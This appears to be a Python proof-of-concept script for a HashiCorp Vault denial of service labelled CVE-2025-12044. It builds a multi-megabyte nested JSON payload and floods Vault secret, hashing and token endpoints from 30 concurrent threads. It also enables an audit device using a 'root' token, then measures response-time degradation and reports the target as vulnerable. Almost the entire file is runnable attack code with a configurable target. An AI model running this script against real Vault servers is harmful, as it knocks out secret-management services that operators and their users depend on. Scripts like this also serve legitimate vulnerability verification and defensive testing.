#!/usr/bin/env python3
import requests
import json
import time
import sys
import threading
import os

TARGET = os.environ.get("TARGET", "http://localhost:8200")
CONCURRENT_WORKERS = 30
REQUESTS_PER_WORKER = 5
OBJECT_WIDTH = 3000
STRING_LEN = 150

def create_payload(width, string_len):
    obj = {}
    for i in range(width):
        obj[f'key_{i}'] = {
            'value': 'X' * string_len,
            'items': [{'n': j, 's': 'Y' * 80} for j in range(40)],
            'meta': {'a': 'A' * 150, 'b': 'B' * 150}
        }
    return json.dumps(obj)

def attack_worker(worker_id, payload, results, stop_event):
    session = requests.Session()
    endpoints = ["/v1/secret/data/test", "/v1/sys/tools/hash", "/v1/auth/token/create"]
    
    for i in range(REQUESTS_PER_WORKER):
        if stop_event.is_set():
            break
        try:
            start = time.time()
            endpoint = endpoints[i % len(endpoints)]
            r = session.post(f"{TARGET}{endpoint}", data=payload, 
                           headers={"Content-Type": "application/json"}, timeout=60)
            duration = time.time() - start
            results.append({"worker": worker_id, "status": r.status_code, "duration": duration})
        except requests.exceptions.Timeout:
            results.append({"worker": worker_id, "status": "timeout", "duration": 60})
        except requests.exceptions.ConnectionError:
            results.append({"worker": worker_id, "status": "conn_error", "duration": 0})
        except Exception as e:
            results.append({"worker": worker_id, "status": "error", "duration": 0})

def measure_response_time(count=5):
    times = []
    for _ in range(count):
        try:
            start = time.time()
            requests.get(f"{TARGET}/v1/sys/health", timeout=30)
            times.append(time.time() - start)
        except:
            times.append(30.0)
    return sum(times) / len(times) if times else 30.0

def main():
    print("=" * 70)
    print("CVE-2025-12044: HashiCorp Vault Rate Limit Regression DoS")
    print("=" * 70)
    
    print("\n[1] Checking target...")
    try:
        r = requests.get(f"{TARGET}/v1/sys/health", timeout=5)
        version = r.json().get("version", "Unknown")
        print(f"    Target: {TARGET}")
        print(f"    Version: {version}")
    except Exception as e:
        print(f"    ERROR: Cannot connect - {e}")
        return False
    
    print("\n[2] Enabling audit device...")
    try:
        r = requests.get(f"{TARGET}/v1/sys/audit", headers={"X-Vault-Token": "root"}, timeout=5)
        if not r.json().get("data"):
            requests.put(f"{TARGET}/v1/sys/audit/file", headers={"X-Vault-Token": "root"},
                        json={"type": "file", "options": {"file_path": "stdout"}}, timeout=5)
        print("    Audit device: ENABLED")
    except Exception as e:
        print(f"    WARNING: {e}")
    
    print("\n[3] Measuring baseline...")
    baseline = measure_response_time(10)
    print(f"    Baseline response time: {baseline*1000:.2f}ms")
    
    print(f"\n[4] Building payload (width={OBJECT_WIDTH}, string_len={STRING_LEN})...")
    payload = create_payload(OBJECT_WIDTH, STRING_LEN)
    print(f"    Payload size: {len(payload)//1024}KB ({len(payload)/1024/1024:.2f}MB)")
    
    print("\n[5] Testing single request processing time...")
    start = time.time()
    r = requests.post(f"{TARGET}/v1/secret/data/test", data=payload,
                     headers={"Content-Type": "application/json"}, timeout=60)
    single_time = time.time() - start
    print(f"    Single request time: {single_time:.3f}s (Status: {r.status_code})")
    
    if single_time < 0.5:
        print("    WARNING: Single request too fast, payload may not be complex enough")
    
    total_requests = CONCURRENT_WORKERS * REQUESTS_PER_WORKER
    print(f"\n[6] Launching concurrent attack ({CONCURRENT_WORKERS} workers x {REQUESTS_PER_WORKER} = {total_requests})...")
    
    results = []
    stop_event = threading.Event()
    threads = []
    attack_start = time.time()
    
    for i in range(CONCURRENT_WORKERS):
        t = threading.Thread(target=attack_worker, args=(i, payload, results, stop_event))
        threads.append(t)
        t.start()
    
    degraded_count = 0
    while any(t.is_alive() for t in threads):
        time.sleep(3)
        rt = measure_response_time(3)
        deg = ((rt - baseline) / baseline) * 100 if baseline > 0 else 0
        print(f"    [{len(results)}/{total_requests}] Health check: {rt*1000:.1f}ms ({deg:+.0f}%)")
        if deg > 200:
            degraded_count += 1
    
    for t in threads:
        t.join()
    
    attack_duration = time.time() - attack_start
    
    print(f"\n[7] Attack completed in {attack_duration:.2f}s")
    
    print("\n[8] Measuring post-attack response time...")
    time.sleep(3)
    post_attack = measure_response_time(10)
    degradation = ((post_attack - baseline) / baseline) * 100 if baseline > 0 else 0
    print(f"    Post-attack: {post_attack*1000:.2f}ms ({degradation:+.1f}%)")
    
    success = sum(1 for r in results if isinstance(r["status"], int))
    timeouts = sum(1 for r in results if r["status"] == "timeout")
    errors = sum(1 for r in results if r["status"] in ["conn_error", "error"])
    durations = [r["duration"] for r in results if isinstance(r["duration"], (int, float)) and r["duration"] > 0]
    avg_duration = sum(durations) / len(durations) if durations else 0
    max_duration = max(durations) if durations else 0
    slow_count = sum(1 for d in durations if d > 2.0)
    
    print("\n" + "=" * 70)
    print("RESULTS:")
    print(f"    Requests sent:       {total_requests}")
    print(f"    Completed:           {success}")
    print(f"    Timeouts:            {timeouts}")
    print(f"    Errors:              {errors}")
    print(f"    Slow (>2s):          {slow_count} ({slow_count*100//len(durations) if durations else 0}%)")
    print(f"    Avg request time:    {avg_duration:.3f}s")
    print(f"    Max request time:    {max_duration:.3f}s")
    print(f"    Baseline RT:         {baseline*1000:.2f}ms")
    print(f"    Post-attack RT:      {post_attack*1000:.2f}ms")
    print(f"    RT degradation:      {degradation:+.1f}%")
    print(f"    Degraded checks:     {degraded_count}")
    print("=" * 70)
    
    vulnerable = False
    evidence = []
    
    if timeouts > 0:
        vulnerable = True
        evidence.append(f"Request timeouts: {timeouts}")
    if slow_count > total_requests * 0.5:
        vulnerable = True
        evidence.append(f"Majority slow responses: {slow_count}/{total_requests}")
    if avg_duration > 1.5:
        vulnerable = True
        evidence.append(f"High avg request time: {avg_duration:.2f}s")
    if degraded_count >= 2:
        vulnerable = True
        evidence.append(f"Sustained service degradation during attack")
    if degradation > 100:
        vulnerable = True
        evidence.append(f"Post-attack degradation: {degradation:.0f}%")
    
    if vulnerable:
        print("\n[+] VULNERABLE - CVE-2025-12044 CONFIRMED")
        print("\nEvidence:")
        for e in evidence:
            print(f"  - {e}")
        print("\nAnalysis:")
        print("  Complex JSON payloads consume significant server resources during parsing.")
        print("  Due to rate limit regression, these requests bypass throttling and")
        print("  directly impact service availability. Combined with mandatory audit")
        print("  logging, this enables effective unauthenticated DoS attacks.")
        return True
    else:
        print("\n[-] Vulnerability effects not conclusive")
        return False

if __name__ == "__main__":
    try:
        result = main()
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print("\n\nInterrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
